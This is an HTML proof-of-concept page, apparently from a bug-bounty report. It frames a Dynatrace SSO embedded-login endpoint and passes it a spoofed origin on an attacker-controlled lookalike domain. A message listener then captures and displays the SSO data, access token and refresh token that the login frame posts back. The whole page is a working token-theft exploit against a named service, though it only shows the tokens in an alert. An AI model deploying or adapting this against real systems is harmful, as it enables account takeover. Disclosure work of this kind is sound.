<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>nileninja poc</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body> 
    <h1>POC file</h1>
    <iframe src="https://chatstage-one.dynatrace.com/api/sso/oauth2/embedded/login?timestamp=1741941638853&origin=https%3A%2F%2Fchatstage-one.dynatrace.com.nileninja.site"></iframe>
    <script>    
        window.addEventListener("message", event => {
          // Parse the JSON data from the event
          const parsedResponse = JSON.parse(event.data);
          
          // Access and alert the content as text
          const alertMessage = `
              SSO: ${parsedResponse.sso}
              Access Token: ${parsedResponse.tokenSet.accessToken}
              Refresh Token: ${parsedResponse.tokenSet.refreshToken}
              Expires In: ${parsedResponse.tokenSet.expiresInSeconds} seconds
              Error: ${parsedResponse.error ? parsedResponse.error : 'No error'}
          `;
          
          alert(alertMessage);
      });
    </script>
  </body>
</html>
